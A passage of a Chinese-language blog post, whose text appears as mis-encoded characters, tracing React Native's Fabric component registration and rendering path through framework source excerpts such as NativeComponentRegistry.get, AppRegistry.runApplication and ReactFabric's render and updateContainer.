          <span class="hljs-keyword">const</span> {components} = <span class="hljs-variable language_">module</span>;

          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(components)
            .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">componentName: string</span>) =&gt;</span> {
              <span class="hljs-keyword">const</span> component = components[componentName];

              <span class="hljs-keyword">if</span> (component.<span class="hljs-property">paperComponentNameDeprecated</span>) {
                imports.<span class="hljs-title function_">add</span>(<span class="hljs-variable constant_">UIMANAGER_IMPORT</span>);
              }

              <span class="hljs-keyword">const</span> replacedTemplate = <span class="hljs-title class_">ComponentTemplate</span>({
                componentName,
                <span class="hljs-attr">paperComponentName</span>: component.<span class="hljs-property">paperComponentName</span>,
                <span class="hljs-attr">paperComponentNameDeprecated</span>:
                  component.<span class="hljs-property">paperComponentNameDeprecated</span>,
              });
      <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ...... </span>

      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[fileName, replacedTemplate]]);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`\nError parsing schema for <span class="hljs-subst">${libraryName}</span>\n`</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(schema));
      <span class="hljs-keyword">throw</span> error;
    }
  },
};
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬æ ¹æ®<code>ComponentTemplate</code>ä¸­çš„æ¨¡æ¿ï¼Œå¤§æ¦‚å°±èƒ½è¿˜åŸå‡ºç”Ÿæˆçš„ä»£ç æ˜¯ä»€ä¹ˆæ ·å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// è¾“å…¥ï¼š</span>
<span class="hljs-comment">// libraryName: "MyComponent"</span>
<span class="hljs-comment">// schema: { è§£æåçš„TypeScript/Flowç±»å‹ä¿¡æ¯ }</span>

<span class="hljs-comment">// è¾“å‡ºï¼šå®Œæ•´çš„JavaScriptä»£ç å­—ç¬¦ä¸²</span>
<span class="hljs-meta">

'use strict'</span>;

<span class="hljs-keyword">const</span> {<span class="hljs-title class_">UIManager</span>} = <span class="hljs-built_in">require</span>(<span class="hljs-string">"react-native"</span>)

<span class="hljs-keyword">let</span> nativeComponentName = <span class="hljs-string">'MyComponent'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> __INTERNAL_VIEW_CONFIG = {
  <span class="hljs-attr">uiViewClassName</span>: <span class="hljs-string">'MyComponent'</span>,
  <span class="hljs-attr">bubblingEventTypes</span>: {},
  <span class="hljs-attr">directEventTypes</span>: {},
  <span class="hljs-attr">validAttributes</span>: {
    <span class="hljs-attr">opacity</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">backgroundColor</span>: { <span class="hljs-attr">process</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">'react-native/Libraries/StyleSheet/processColor'</span>).<span class="hljs-property">default</span> },
    <span class="hljs-comment">// ... å…¶ä»–å±æ€§</span>
  }
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NativeComponentRegistry</span>.<span class="hljs-title function_">get</span>(nativeComponentName, <span class="hljs-function">() =&gt;</span> __INTERNAL_VIEW_CONFIG);
</code></pre>
<p>è¿™é‡Œæœ€å…³é”®çš„å°±æ˜¯æœ€åä¸€è¡Œï¼Œå®ƒå°†å¼€å‘è€…ç¼–å†™çš„Fabric ç»„ä»¶è§„èŒƒè¿›è¡Œäº†ä»£ç æ›¿æ¢ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¼€å‘è€…ç¼–å†™</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">CustomView</span> = codegenNativeComponent&lt;<span class="hljs-title class_">Props</span>&gt;(<span class="hljs-string">'CustomView'</span>);

<span class="hljs-comment">// Babelæ’ä»¶æ›¿æ¢å</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">CustomView</span> = <span class="hljs-title class_">NativeComponentRegistry</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'CustomView'</span>, <span class="hljs-function">() =&gt;</span> __INTERNAL_VIEW_CONFIG);
</code></pre>
<p>éœ€è¦æ³¨æ„ï¼Œ<strong>babel-plugin-codegen</strong>å·¥å…·å¹¶ä¸åƒ<strong>Codegen</strong>å·¥å…·ï¼Œä¼šç”Ÿæˆå®é™…çš„ä»£ç æ–‡ä»¶ã€‚å®ƒæ˜¯å¯¹ASTè¯­æ³•æ ‘è¿›è¡Œçš„åŠ¨æ€ä¿®æ”¹å’Œæ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¿®æ”¹çš„æ˜¯å†…å­˜ä¸­çš„è¯­æ³•æ ‘ï¼Œå¹¶ä¸ä¼šå†™æ–‡ä»¶ã€‚</p>
<p>ç°åœ¨æ¥é‡ç‚¹è¿½è¸ª<code>NativeComponentRegistry.get</code>çš„å®ç°ï¼Œé¦–å…ˆæ˜¯å¯¼å‡ºä½ç½®<code>react-native/packages/react-native/index.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">get</span> <span class="hljs-title function_">NativeComponentRegistry</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">require</span>(<span class="hljs-string">'./Libraries/NativeComponent/NativeComponentRegistry'</span>);
  },
</code></pre>
<p>å®šä½åˆ°æ–¹æ³•å®ç°<code>react-native/packages/react-native/Libraries/NativeComponent/NativeComponentRegistry.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * è·å–ä¸€ä¸ªå¯ä»¥è¢« React Native æ¸²æŸ“çš„ `NativeComponent`ã€‚
 *
 * æä¾›çš„ `viewConfigProvider` å¯èƒ½ä¼šè¢«è°ƒç”¨å’Œä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½ä¸ä¼šï¼Œ
 * è¿™å–å†³äº `setRuntimeConfigProvider` æ˜¯å¦‚ä½•é…ç½®çš„ã€‚
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> get&lt;<span class="hljs-title class_">Config</span>: {...}&gt;(
  <span class="hljs-attr">name</span>: string,
  <span class="hljs-attr">viewConfigProvider</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">PartialViewConfig</span>,
): <span class="hljs-title class_">HostComponent</span>&lt;<span class="hljs-title class_">Config</span>&gt; {
  <span class="hljs-comment">// æ³¨å†ŒViewConfigåˆ°å…¨å±€æ³¨å†Œè¡¨</span>
  <span class="hljs-title class_">ReactNativeViewConfigRegistry</span>.<span class="hljs-title function_">register</span>(name, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è¿™é‡Œçš„å›è°ƒå‡½æ•°ä¼šåœ¨Reactéœ€è¦ç»„ä»¶é…ç½®æ—¶è¢«è°ƒç”¨</span>
    <span class="hljs-keyword">const</span> {native, verify} = getRuntimeConfig?.(name) ?? {
      <span class="hljs-attr">native</span>: !<span class="hljs-variable language_">global</span>.<span class="hljs-property">RN$Bridgeless</span>,   <span class="hljs-comment">// å…³é”®ï¼šæ–°æ¶æ„æ£€æµ‹</span>
      <span class="hljs-attr">verify</span>: <span class="hljs-literal">false</span>,
    };

    <span class="hljs-keyword">let</span> <span class="hljs-attr">viewConfig</span>: <span class="hljs-title class_">ViewConfig</span>;
    <span class="hljs-keyword">if</span> (native) {
      <span class="hljs-comment">// æ—§æ¶æ„ï¼šåŸç”ŸViewManager</span>
      viewConfig =
        <span class="hljs-title function_">getNativeComponentAttributes</span>(name) ??
        <span class="hljs-title function_">createViewConfig</span>(<span class="hljs-title function_">viewConfigProvider</span>());
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// æ–°æ¶æ„ï¼šä¼˜å…ˆé™æ€ViewConfig</span>
      viewConfig =
        <span class="hljs-title function_">createViewConfig</span>(<span class="hljs-title function_">viewConfigProvider</span>()) ??
        <span class="hljs-title function_">getNativeComponentAttributes</span>(name);
    }
    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
    <span class="hljs-keyword">return</span> viewConfig;
  });

  <span class="hljs-comment">// $FlowFixMe[incompatible-type] `NativeComponent` å®é™…ä¸Šæ˜¯å­—ç¬¦ä¸²!</span>
  <span class="hljs-keyword">return</span> name;
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>ReactNativeViewConfigRegistry.register</code>å®ç°ã€‚æºç <code>react-native/packages/react-native/Libraries/Renderer/shims/ReactNativeViewConfigRegistry.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> viewConfigCallbacks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;string, ?<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">ViewConfig</span>&gt;();


<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">name: string, callback: () =&gt; ViewConfig</span>): string {
  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
  viewConfigCallbacks.<span class="hljs-title function_">set</span>(name, callback);
  <span class="hljs-keyword">return</span> name;
}
</code></pre>
<p>è¿™é‡ŒåŸºæœ¬ä¸Šå°±æ˜¯å°†è¿”å›<code>ViewConfig</code>çš„é—­åŒ…ç»™å­˜äº†èµ·æ¥ã€‚</p>
<h4 data-id="heading-3">æŸ¥æ‰¾ç»„ä»¶</h4>
<h5 data-id="heading-4">JSå±‚</h5>
<p>åœ¨å‰é¢å¯åŠ¨æ¸²æŸ“ä¸€èŠ‚æˆ‘ä»¬çŸ¥é“äº†å¯åŠ¨æ¸²æŸ“çš„æœ€ç»ˆè°ƒç”¨æ˜¯JSå±‚çš„<code>AppRegistry.runApplication</code>æ–¹æ³•ã€‚æ²¿ç€è¿™æ¡çº¿ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹JSå±‚çš„ç»„ä»¶åŠ è½½ä¸å¤„ç†æµç¨‹ã€‚æºç <code>react-native/packages/react-native/Libraries/ReactNative/AppRegistry.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">AppRegistry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./AppRegistryImpl'</span>;

<span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
<span class="hljs-variable language_">global</span>.<span class="hljs-property">RN$AppRegistry</span> = <span class="hljs-title class_">AppRegistry</span>;

<span class="hljs-title function_">registerCallableModule</span>(<span class="hljs-string">'AppRegistry'</span>, <span class="hljs-title class_">AppRegistry</span>);

<span class="hljs-keyword">export</span> {<span class="hljs-title class_">AppRegistry</span>};
</code></pre>
<p>ç»§ç»­è·Ÿè¸ªæºç <code>react-native/packages/react-native/Libraries/ReactNative/AppRegistryImpl.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-attr">runnables</span>: <span class="hljs-title class_">Runnables</span> = {};


<span class="hljs-comment">/**
 * Loads the JavaScript bundle and runs the app.
 *
 * See https://reactnative.dev/docs/appregistry#runapplication
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">runApplication</span>(<span class="hljs-params">
  appKey: string,
  appParameters: AppParameters,
  displayMode?: number,
</span>): <span class="hljs-keyword">void</span> {
  <span class="hljs-keyword">if</span> (appKey !== <span class="hljs-string">'LogBox'</span>) {
    <span class="hljs-keyword">const</span> logParams = __DEV__ ? <span class="hljs-string">` with <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(appParameters)}</span>`</span> : <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> msg = <span class="hljs-string">`Running "<span class="hljs-subst">${appKey}</span>"<span class="hljs-subst">${logParams}</span>`</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);
  }

  <span class="hljs-title class_">SceneTracker</span>.<span class="hljs-title function_">setActiveScene</span>({<span class="hljs-attr">name</span>: appKey});
  runnables[appKey](appParameters, <span class="hljs-title function_">coerceDisplayMode</span>(displayMode));
}


<span class="hljs-comment">/**
 * Registers an app's root component.
 *
 * See https://reactnative.dev/docs/appregistry#registercomponent
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">registerComponent</span>(<span class="hljs-params">
  appKey: string,
  componentProvider: ComponentProvider,
  section?: boolean,
</span>): string {
  <span class="hljs-keyword">const</span> scopedPerformanceLogger = <span class="hljs-title function_">createPerformanceLogger</span>();
  runnables[appKey] = <span class="hljs-function">(<span class="hljs-params">appParameters, displayMode</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> renderApplication = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./renderApplication'</span>).<span class="hljs-property">default</span>;
    <span class="hljs-title function_">renderApplication</span>(
      <span class="hljs-title function_">componentProviderInstrumentationHook</span>(
        componentProvider,
        scopedPerformanceLogger,
      ),
      appParameters.<span class="hljs-property">initialProps</span>,
      appParameters.<span class="hljs-property">rootTag</span>,
      wrapperComponentProvider &amp;&amp; <span class="hljs-title function_">wrapperComponentProvider</span>(appParameters),
      rootViewStyleProvider &amp;&amp; <span class="hljs-title function_">rootViewStyleProvider</span>(appParameters),
      appParameters.<span class="hljs-property">fabric</span>,
      scopedPerformanceLogger,
      appKey === <span class="hljs-string">'LogBox'</span>, <span class="hljs-comment">// is logbox</span>
      appKey,
      displayMode,
    );
  };
  <span class="hljs-keyword">if</span> (section) {
    sections[appKey] = runnables[appKey];
  }
  <span class="hljs-keyword">return</span> appKey;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>runApplication</code>è°ƒç”¨çš„æ˜¯<code>runnables</code>å¯¹è±¡ä¸­æ³¨å†Œçš„é—­åŒ…ã€‚è€Œåœ¨æˆ‘ä»¬React Native JSå±‚çš„BundleåŒ…ä¸­ï¼Œé¦–å…ˆå°±éœ€è¦è°ƒç”¨<code>AppRegistry.registerComponent(appName, () =&gt; App)</code>å®Œæˆæœ€æ ¹ç»„ä»¶çš„æ³¨å†Œã€‚æ‰€ä»¥<code>runApplication</code>æ–¹æ³•ä¸­è°ƒç”¨çš„é—­åŒ…ï¼Œå°±æ˜¯åœ¨<code>registerComponent</code>ä¸­æ³¨å†Œçš„é—­åŒ…ã€‚</p>
<p>ç»§ç»­è·Ÿè¸ª<code>renderApplication</code>æ–¹æ³•çš„å®ç°ï¼Œæºç <code>react-native/packages/react-native/Libraries/ReactNative/renderApplication.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> renderApplication&lt;<span class="hljs-title class_">Props</span>: <span class="hljs-title class_">Object</span>&gt;(
  <span class="hljs-title class_">RootComponent</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>&lt;<span class="hljs-title class_">Props</span>&gt;,
  <span class="hljs-attr">initialProps</span>: <span class="hljs-title class_">Props</span>,
  <span class="hljs-attr">rootTag</span>: any,
  <span class="hljs-title class_">WrapperComponent</span>?: ?<span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>&lt;any&gt;,
  rootViewStyle?: ?<span class="hljs-title class_">ViewStyleProp</span>,
  fabric?: boolean,
  scopedPerformanceLogger?: <span class="hljs-title class_">IPerformanceLogger</span>,
  isLogBox?: boolean,
  debugName?: string,
  displayMode?: ?<span class="hljs-title class_">DisplayModeType</span>,
  useOffscreen?: boolean,
) {

  <span class="hljs-keyword">const</span> performanceLogger = scopedPerformanceLogger ?? <span class="hljs-title class_">GlobalPerformanceLogger</span>;

  <span class="hljs-comment">// æ„å»ºReactå…ƒç´ æ ‘</span>
  <span class="hljs-comment">// å¤–å±‚ï¼šPerformanceLoggerContext.Provider - æä¾›æ€§èƒ½ç›‘æ§ä¸Šä¸‹æ–‡</span>
  <span class="hljs-comment">// ä¸­å±‚ï¼šAppContainer - React Nativeçš„æ ¹å®¹å™¨ç»„ä»¶</span>
  <span class="hljs-comment">// å†…å±‚ï¼šRootComponent - ç”¨æˆ·æ³¨å†Œçš„åº”ç”¨ç»„ä»¶ï¼ˆå¦‚App.jsï¼‰</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">renderable</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">MixedElement</span> = (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">PerformanceLoggerContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{performanceLogger}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">AppContainer</span>
        <span class="hljs-attr">rootTag</span>=<span class="hljs-string">{rootTag}</span>
        <span class="hljs-attr">fabric</span>=<span class="hljs-string">{fabric}</span>
        <span class="hljs-attr">WrapperComponent</span>=<span class="hljs-string">{WrapperComponent}</span>
        <span class="hljs-attr">rootViewStyle</span>=<span class="hljs-string">{rootViewStyle}</span>
        <span class="hljs-attr">initialProps</span>=<span class="hljs-string">{initialProps</span> ?? <span class="hljs-attr">Object.freeze</span>({})}
        <span class="hljs-attr">internal_excludeLogBox</span>=<span class="hljs-string">{isLogBox}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RootComponent</span> {<span class="hljs-attr">...initialProps</span>} <span class="hljs-attr">rootTag</span>=<span class="hljs-string">{rootTag}</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">AppContainer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">PerformanceLoggerContext.Provider</span>&gt;</span></span>
  );

  <span class="hljs-comment">// å¼€å‘æ¨¡å¼è°ƒè¯•åŒ…è£…</span>
  <span class="hljs-keyword">if</span> (__DEV__ &amp;&amp; debugName) {
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">RootComponentWithMeaningfulName</span> = <span class="hljs-title function_">getCachedComponentWithDebugName</span>(
      <span class="hljs-string">`<span class="hljs-subst">${debugName}</span>(RootComponent)`</span>,
    );
    renderable = (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">RootComponentWithMeaningfulName</span>&gt;</span>
        {renderable}
      <span class="hljs-tag">&lt;/<span class="hljs-name">RootComponentWithMeaningfulName</span>&gt;</span></span>
    );
  }

  <span class="hljs-comment">//  å®éªŒæ€§ç¦»å±æ¸²æŸ“æ”¯æŒ</span>
  <span class="hljs-keyword">if</span> (useOffscreen &amp;&amp; displayMode != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// $FlowFixMe[incompatible-type]</span>
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    <span class="hljs-comment">// $FlowFixMe[missing-export]</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">Activity</span>: <span class="hljs-title class_">ActivityType</span> = <span class="hljs-title class_">React</span>.<span class="hljs-property">unstable_Activity</span>;

    renderable = (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Activity</span>
        <span class="hljs-attr">mode</span>=<span class="hljs-string">{displayMode</span> === <span class="hljs-string">DisplayMode.VISIBLE</span> ? '<span class="hljs-attr">visible</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">hidden</span>'}&gt;</span>
        {renderable}
      <span class="hljs-tag">&lt;/<span class="hljs-name">Activity</span>&gt;</span></span>
    );
  }

  <span class="hljs-comment">// æˆ‘ä»¬å¸Œæœ›åœ¨ä½¿ç”¨ Fabric æ—¶å§‹ç»ˆå¯ç”¨ concurrentRoot åŠŸèƒ½</span>
  <span class="hljs-keyword">const</span> useConcurrentRoot = <span class="hljs-title class_">Boolean</span>(fabric);

  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†æ€§èƒ½æ—¥å¿—æ‰“å°......</span>

  <span class="hljs-comment">// è¿›å…¥Reactæ¸²æŸ“ç³»ç»Ÿ</span>
  <span class="hljs-title class_">Renderer</span>.<span class="hljs-title function_">renderElement</span>({
    <span class="hljs-attr">element</span>: renderable,
    rootTag,
    <span class="hljs-attr">useFabric</span>: <span class="hljs-title class_">Boolean</span>(fabric),
    useConcurrentRoot,
  });
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>Renderer.renderElement</code>æ–¹æ³•å®ç°ã€‚æºç <code>react-native/packages/react-native/Libraries/ReactNative/RendererImplementation.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">renderElement</span>(<span class="hljs-params">{
  element,
  rootTag,
  useFabric,
  useConcurrentRoot,
}: {
  element: React.MixedElement,
  rootTag: number,
  useFabric: boolean,
  useConcurrentRoot: boolean,
}</span>): <span class="hljs-keyword">void</span> {
  <span class="hljs-keyword">if</span> (useFabric) {
    <span class="hljs-keyword">if</span> (cachedFabricRender == <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// è·å–å®é™…æ¸²æŸ“å™¨</span>
      cachedFabricRender = <span class="hljs-title function_">getFabricRenderer</span>().<span class="hljs-property">render</span>;
    }

    <span class="hljs-title function_">cachedFabricRender</span>(element, rootTag, <span class="hljs-literal">null</span>, useConcurrentRoot, {
      onCaughtError,
      onUncaughtError,
      onRecoverableError,
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// çœç•¥æ—§æ¶æ„......</span>
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFabricRenderer</span>(<span class="hljs-params"/>): <span class="hljs-title class_">ReactFabricType</span> {
  <span class="hljs-keyword">if</span> (cachedFabricRenderer == <span class="hljs-literal">null</span>) {
    cachedFabricRenderer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../Renderer/shims/ReactFabric'</span>).<span class="hljs-property">default</span>;
  }
  <span class="hljs-keyword">return</span> cachedFabricRenderer;
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>react-native/packages/react-native/Libraries/Renderer/shims/ReactFabric.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> {<span class="hljs-title class_">BatchedBridge</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native/Libraries/ReactPrivate/ReactNativePrivateInterface'</span>;

<span class="hljs-keyword">import</span> type {<span class="hljs-title class_">ReactFabricType</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'./ReactNativeTypes'</span>;

<span class="hljs-keyword">let</span> <span class="hljs-title class_">ReactFabric</span>: <span class="hljs-title class_">ReactFabricType</span>;

<span class="hljs-keyword">if</span> (__DEV__) {
  <span class="hljs-title class_">ReactFabric</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../implementations/ReactFabric-dev'</span>);
} <span class="hljs-keyword">else</span> {
  <span class="hljs-title class_">ReactFabric</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../implementations/ReactFabric-prod'</span>);
}

<span class="hljs-variable language_">global</span>.<span class="hljs-property">RN$stopSurface</span> = <span class="hljs-title class_">ReactFabric</span>.<span class="hljs-property">stopSurface</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">global</span>.<span class="hljs-property">RN$Bridgeless</span> !== <span class="hljs-literal">true</span>) {
  <span class="hljs-title class_">BatchedBridge</span>.<span class="hljs-title function_">registerCallableModule</span>(<span class="hljs-string">'ReactFabric'</span>, <span class="hljs-title class_">ReactFabric</span>);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ReactFabric</span>;
</code></pre>
<p>è¿™é‡Œæ ¹æ®å¼€å‘ç¯å¢ƒé€‰æ‹©äº†ä¸åŒçš„æ¸²æŸ“å™¨ã€‚å¼€å‘ç¯å¢ƒçš„æ¸²æŸ“å™¨ä½“ç§¯æ›´å¤§ï¼ŒåŒ…å«äº†è®¸å¤šè°ƒè¯•ã€æ€§èƒ½æ—¥å¿—ç­‰ä¿¡æ¯ï¼Œè€Œç”Ÿäº§ç¯å¢ƒçš„ç§»é™¤äº†æ³¨é‡Šå’Œç©ºç™½ï¼Œå˜é‡åè¢«å‹ç¼©ä»£ç ç»è¿‡ä¼˜åŒ–ï¼Œå‡å°‘åŒ…ä½“ç§¯ã€‚</p>
<p>ç»§ç»­è·Ÿè¸ªç”Ÿäº§ç¯å¢ƒçš„æ¸²æŸ“å™¨ï¼Œå› ä¸ºä»£ç æ›´åŠ ç®€æ´ï¼Œå¯æ›´å¥½çš„èšç„¦äºè°ƒç”¨çš„é“¾è·¯å’Œæµç¨‹ã€‚æºç <code>react-native/packages/react-native/Libraries/Renderer/implementations/ReactFabric-prod.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">exports</span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">
  element,
  containerTag,
  callback,
  concurrentRoot,
  options
</span>) {
  <span class="hljs-keyword">var</span> root = roots.<span class="hljs-title function_">get</span>(containerTag);
  <span class="hljs-keyword">if</span> (!root) {
    <span class="hljs-comment">// åˆ›å»ºæ–°çš„FiberRootNode</span>
    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>

    <span class="hljs-title function_">initializeUpdateQueue</span>(concurrentRoot);
    roots.<span class="hljs-title function_">set</span>(containerTag, root);
  }
  <span class="hljs-comment">// å¯åŠ¨æ¸²æŸ“ </span>
  <span class="hljs-title function_">updateContainer</span>(element, root, <span class="hljs-literal">null</span>, callback);
  <span class="hljs-comment">// è¿”å›æ¸²æŸ“åçš„å…¬å…±å®ä¾‹å¼•ç”¨</span>
  <span class="hljs-attr">a</span>: <span class="hljs-keyword">if</span> (((element = root.<span class="hljs-property">current</span>), element.<span class="hljs-property">child</span>))
    <span class="hljs-keyword">switch</span> (element.<span class="hljs-property">child</span>.<span class="hljs-property">tag</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-number">27</span>:
      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
        element = <span class="hljs-title function_">getPublicInstance</span>(element.<span class="hljs-property">child</span>.<span class="hljs-property">stateNode</span>);
        <span class="hljs-keyword">break</span> a;
      <span class="hljs-attr">default</span>:
        element = element.<span class="hljs-property">child</span>.<span class="hljs-property">stateNode</span>;
    }
  <span class="hljs-keyword">else</span> element = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> element;
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateContainer</span>(<span class="hljs-params">element, container, parentComponent, callback</span>) {
  parentComponent = container.<span class="hljs-property">current</span>;
  <span class="hljs-comment">// / è·å–æ›´æ–°ä¼˜å…ˆçº§</span>
  <span class="hljs-keyword">var</span> lane = <span class="hljs-title function_">requestUpdateLane</span>(parentComponent);
  <span class="hljs-literal">null</span> === container.<span class="hljs-property">context</span>
    ? (container.<span class="hljs-property">context</span> = emptyContextObject)
    : (container.<span class="hljs-property">pendingContext</span> = emptyContextObject);

  <span class="hljs-comment">// åˆ›å»ºæ›´æ–°å¯¹è±¡</span>
  container = <span class="hljs-title function_">createUpdate</span>(lane);
  container.<span class="hljs-property">payload</span> = { <span class="hljs-attr">element</span>: element };
  callback = <span class="hljs-keyword">void</span> <span class="hljs-number">0</span> === callback ? <span class="hljs-literal">null</span> : callback;
  <span class="hljs-literal">null</span> !== callback &amp;&amp; (container.<span class="hljs-property">callback</span> = callback);

  <span class="hljs-comment">// å°†æ›´æ–°åŠ å…¥é˜Ÿåˆ—</span>
  element = <span class="hljs-title function_">enqueueUpdate</span>(parentComponent, container, lane);

  <span class="hljs-comment">// è°ƒåº¦æ›´æ–°</span>
  <span class="hljs-literal">null</span> !== element &amp;&amp;
    (<span class="hljs-title function_">scheduleUpdateOnFiber</span>(element, parentComponent, lane),
    <span class="hljs-title function_">entangleTransitions</span>(element, parentComponent, lane));
  <span class="hljs-keyword">return</span> lane;
}
</code></pre>
<p>ä»¥ä¸Šè°ƒç”¨éƒ½æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œçš„æ ¸å¿ƒæ˜¯<code>scheduleUpdateOnFiber</code>æ–¹æ³•ï¼Œå®ƒè´Ÿè´£è°ƒåº¦æ›´æ–°ã€‚ç”±äºä»£ç é‡è¾ƒå¤§ï¼Œæˆ‘ä»¬åé¢åªè¿½æ±‚æ ¸å¿ƒé€»è¾‘ï¼Œå°†çœç•¥å¤§éƒ¨åˆ†ä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleUpdateOnFiber</span>(<span class="hljs-params">root, fiber, lane</span>) {
  <span class="hljs-comment">// çœç•¥......</span>

  <span class="hljs-comment">// æ ‡è®°æ›´æ–°å¹¶è§¦å‘è°ƒåº¦</span>
  <span class="hljs-title function_">markRootUpdated$1</span>(root, lane);
  <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* ä¸åœ¨æ¸²æŸ“ä¸­ */</span>) {
      <span class="hljs-title function_">ensureRootIsScheduled</span>(root);                    <span class="hljs-comment">// ç¡®ä¿æ ¹èŠ‚ç‚¹è¢«è°ƒåº¦</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* åŒæ­¥æ›´æ–° */</span>) {
